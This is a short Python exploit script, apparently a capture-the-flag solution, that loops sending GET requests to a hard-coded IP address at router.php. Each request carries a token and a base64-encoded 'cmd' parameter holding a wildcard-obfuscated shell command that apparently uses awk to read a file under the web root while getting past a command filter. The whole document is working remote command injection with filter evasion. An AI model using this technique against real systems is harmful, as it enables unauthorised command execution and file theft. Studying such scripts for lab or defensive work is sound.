#!/usr/bin/env python3
import base64
import requests


def main():
    token = "FdOdNh1AhHysdYlcqjpx2Ze6KbwuT6SxEUg9EAQG"
    while True:
        url = "http://35.198.143.196:32431/router.php?token=" + token + "&cmd="
        payload = b'/*s*/*/aw* 4 /*a*/www/*/*la*/*la*.p*p'
        encrypted = base64.b64encode(payload).decode()
        r = requests.get(url + encrypted)
        print(r.text)


main()